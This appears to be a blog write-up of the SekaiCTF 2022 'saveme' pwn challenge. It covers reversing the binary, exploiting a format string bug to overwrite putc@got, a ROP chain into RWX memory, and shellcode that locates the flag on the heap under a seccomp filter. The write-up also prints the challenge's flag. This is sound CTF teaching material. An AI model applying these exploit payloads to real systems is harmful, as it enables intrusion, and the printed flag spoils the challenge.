---
title:  "SekaiCTF 2022 saveme writeup"
layout: post
categories: media
---

# Intro

Hello again, its been a while. Havent written anything recently mainly because I dont have anything to write about - im still playing ctf but most of the challenges I solve (or more likely, fail miserably to solve) don't have anything that hasnt been discussed already at length - and in a 
much more entertaining and informative way than i could.

Today is different, though.

This weekend i played SekaiCTF with zh3r0. I only managed to solve a single pwn challenge - saveme. It was fairly unique - not as much as the other pwn challenges, though :P. 

# The challenge
Starting the binary we are greeted with a simple prompt:

```
This is the message from flag:
------------------------------------------------------
| I got lost in my memory, moving around and around. |
| Please help me out!                                |
| Here is your gift: 0x7fff84b50a40                  |
------------------------------------------------------
[1] Save him
[2] Ignore
Your option: 
```

Already a stack leak, nice. Apparently `flag` has gotten lost somewhere in memory. We have the choice to either save him, or ignore him. Well, given that I'm playing ctf I dont have time for the problems of others at the moment, so we ignore:

```
Please leave note for the next person: 
```

We can leave a note for the next poor soul that comes by, okay. Which then gets printed back to us - of course.

## Reversing

Checksec gives us:

```
[*] '/root/Documents/CTF/SekaiCTF22/saveme/saveme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fc000)
```

Partial relro and no PIE generally makes a nice 1-2 combo - lets see if we can use this anywhere. The main function looks like this:

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 choice; // [rsp+8h] [rbp-68h] BYREF
  char format[88]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 v6; // [rsp+68h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  choice = 0LL;
  load_flag(a1, a2, a3);
  alloc_mem_and_setup(format);
  seccomp_start();
  puts("This is the message from flag:");
  puts("------------------------------------------------------");
  puts("| I got lost in my memory, moving around and around. |");
  puts("| Please help me out!                                |");
  printf("| Here is your gift: %p                  |\n", format);// memory leak?
  puts("------------------------------------------------------");
  puts("[1] Save him");
  puts("[2] Ignore");
  printf("Your option: ");
  __isoc99_scanf("%lld", &choice);
  if ( choice == 1 )
  {
    puts("Hmmm, so where should I start to go?");
  }
  else if ( choice == 2 )
  {
    printf("Please leave note for the next person: ");
    __isoc99_scanf("%80s", format);
    printf(format);                             // fsb
    putc(10, stdout);
  }
  return 0LL;
}
```

Prett much what we would expect from out interactions. However there are a few intersting functions - and an obvious format string bug.

Lets take a look at `load_flag`:

```c
unsigned __int64 load_flag()
{
  int fd; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  buf = malloc(0x50uLL);
  fd = open("flag.txt", 0);
  if ( fd == -1 )
  {
    puts("Cannot read flag!\nExiting...");
    exit(-1);
  }
  read(fd, buf, 0x50uLL);
  close(fd);
  return v3 - __readfsqword(0x28u);
}
```

Nice, so no need to open the file ourselves - the flag will be stored on the heap, so once we get some kind of code execution it should be fairly easy to find. Now lets take a look into `alloc_mem_and_setup`:

```c
unsigned __int64 __fastcall alloc_mem_and_setup(void *a1)
{
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  memset(a1, 0, 0x50uLL);
  mmap((void *)0x405000, 0x1000uLL, 7, 34, 0, 0LL);// rwx mem
  return v2 - __readfsqword(0x28u);
}
```

Very interesting, it seems the author is giving us a not so subtle nudge that to reach the flag, we should be using shellcode. 

Theres one more function that we should be interested in, `seccomp_start`:

```c
unsigned __int64 sub_4012BB()
{
  __int64 v1; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = seccomp_init(0LL);
  seccomp_rule_add(v1, 2147418112LL, 0LL, 0LL);
  seccomp_rule_add(v1, 2147418112LL, 1LL, 0LL);
  seccomp_rule_add(v1, 2147418112LL, 231LL, 0LL);
  seccomp_load(v1);
  return v2 - __readfsqword(0x28u);
}
```

So we setup some rules, we can see them clearer using seccomp-tools:

```
oot in ~/Documents/CTF/SekaiCTF22/saveme λ seccomp-tools dump ./saveme 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008
 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008
 0007: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
```

So, we allow only the x86_64 syscalls for `read`, `write` and `exit_group`. This is fine though, because as we saw prior the flag is already in memory - so no need to `open` it a second time.

Now that we have a good idea of our situation, lets move on to exploitation.

## Exploitation

The important thing here is the scanf - we only get 80 chars of space. I tried a lot of different approaches.
 
 The first was hijacking `putc@got` to return back into main to get more uses of the fsb this always resulted in either printf or scanf segfaulting in-function due to a mis-aligned stack. We can see in the instruction documentation for [movaps](https://c9x.me/x86/html/file_module_x86_id_180.html) that `When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) is generated.`

This is generally the case for instructions that deal with floating points that require writing to a destination.

My second approach was to write a ropchain to the stack, however owing to the amount of space i was only able to write about 2 qwords - not enough for anything resembling a ropchain. 

The reason I used so many bytes was because if i used more than a certain number of padding characters for my format string at a time, seccomp would kill my process due to SIGSYS (bad syscall). I thought it could be `brk()` triggering this, as it is a trick in CTF to get malloc to call by providing an obscenely large string, but i never took the time to figure it out.

My final approach is fairly simple - yet ironically took me the longest to come up with. If we take a look at the stack before we call `putc`, we can see the following:

```
0x007fffffffe230│+0x0000: 0x0000000000000000	 ← $rsp
0x007fffffffe238│+0x0008: 0x0000000000000002
0x007fffffffe240│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	 ← $r10
0x007fffffffe248│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAA"
0x007fffffffe250│+0x0020: "AAAAAAAAAAAAAAA"
0x007fffffffe258│+0x0028: 0x41414141414141 ("AAAAAAA"?)
0x007fffffffe260│+0x0030: 0x0000000000000000
0x007fffffffe268│+0x0038: 0x0000000000000000
```

We have 2 qwords, and then our input buffer. This made me think - what if I hijacked `putc@got` with a gadget that has more than 2 pops? Then surely our stack ptr would be on top of our input - and we could have an actual ropchain!

My payload in the end looked like this:

```python
    pload = b"%5554c" + b"%10$hn" + b"A"*4 + p64(e.got['putc']) 
    #0x00000000004015bb: pop rdi; ret; 
    pload += p64(0x4015bb)
    # 0x4021a0 - 0x4021a4  →   "%80s" 
    pload += p64(0x4021a0)
    #0x00000000004015b9: pop rsi; pop r15; ret;
    pload += p64(0x4015b9)
    pload += p64(rwx)
    pload += b"B"*8
    #pload += p64(0x4015bb+1)
    # [0x404088] __isoc99_scanf@GLIBC_2.7  →  0x401116
    pload += p64(0x401116) 
    pload += p64(rwx)
```

First we hit the got like we talked about, we overwrite the last 2 bytes so it looks like:

```
gef➤  x/7i 0x4015b2
   0x4015b2:	pop    rbx
   0x4015b3:	pop    rbp
   0x4015b4:	pop    r12
   0x4015b6:	pop    r13
   0x4015b8:	pop    r14
   0x4015ba:	pop    r15
   0x4015bc:	ret
```

This is enough pops that we can safely return into our input string after our payload.

Next, we setup a small chain to call `scanf("%80s", 0x405000)` so we can load an initial shellcode.

My first shellcode is a small `read`:

```
    mov rax, 0 
    mov rdi, 0 
    mov rsi, 0x405000 
    mov rdx, 0x4141 
    syscall
```

The idea being that my final payload can have any number of badchars, and i wont have to deal with `scanf` failing - because fuck `scanf` :) .

My final payload will require some explanation:

```
    shc = asm(''' 

    pop rcx
    pop rcx
    pop rcx
    pop rcx
    sub rcx, 0x240b3
    mov rsi, rcx 
    sub rsi, 0x2910
    mov rsi, qword ptr [rsi]
    add rsi, 0x290
    mov rax, 1 
    mov rdi, 1 
    mov rdx, 64 
    syscall

    ''')

    p.sendline(b"\x90"*0x20 + shc)
```

Firstly, we `pop rcx`. This is because further down the stack, there is a pointer to `__libc_start_main`. Once we get it, subtract to get the base of libc - not really needed but its convenient. Finally, i did some looking around for a heap address we could load, and I found that the address of the `tcache_perthread_struct` is stored in the [thread local storage](https://web.mit.edu/rhel-doc/3/rhel-gcc-en-3/thread-local.html). 

I wont explain much of it, but its basically just an area you can use to store variables uniquely to a thread. It also stores some data such as the original canary, some destructor functions, and some other stuff.

So we subtract from libc until we reach the tls, as it is stored adjacent to libc, and then we load the heap address. Since the flag is the second chunk allocated after the tcache, all we have to do is add the size to its address, and we should be able to get the flag chunk. 

Finally we write out what should be the flag to stdout:

```
                                                                                       QAAAAp@@[DEBUG] Received 0x78 bytes:
    00000000  53 45 4b 41  49 7b 59 30  75 5f 67 30  54 5f 6d 33  │SEKA│I{Y0│u_g0│T_m3│
    00000010  5f 6e 40 77  5f 39 33 65  31 32 37 66  63 36 65 33  │_n@w│_93e│127f│c6e3│
    00000020  61 62 37 33  37 31 32 34  30 38 61 35  30 39 30 66  │ab73│7124│08a5│090f│
    00000030  63 39 61 31  32 7d 00 00  00 00 00 00  00 00 00 00  │c9a1│2}··│····│····│
    00000040  2f 72 75 6e  2e 73 68 3a  20 6c 69 6e  65 20 33 3a  │/run│.sh:│ lin│e 3:│
    00000050  20 20 20 36  31 33 20 53  65 67 6d 65  6e 74 61 74  │   6│13 S│egme│ntat│
    00000060  69 6f 6e 20  66 61 75 6c  74 20 20 20  20 20 20 2e  │ion │faul│t   │   .│
    00000070  2f 73 61 76  65 6d 65 0a                            │/sav│eme·│
    00000078
SEKAI{Y0u_g0T_m3_n@w_93e127fc6e3ab73712408a5090fc9a12}\x00\x00\x00\x00\x00/run.sh: line 3:   613 Segmentation fault      ./saveme
```

This challenge was pretty fun - it reminded me of how many different ways you can exploit an arbitrary write in a context like this. Now that we found flag, we have to give his gift back - we never even used the stack leak! 

;(

# Closing remarks

Fun challenge, and very fun ctf. Thats it. 

See you in another 3 months :P.

Also thanks to my teammate [striker](https://ctftime.org/user/88332) for his help on the challenge.
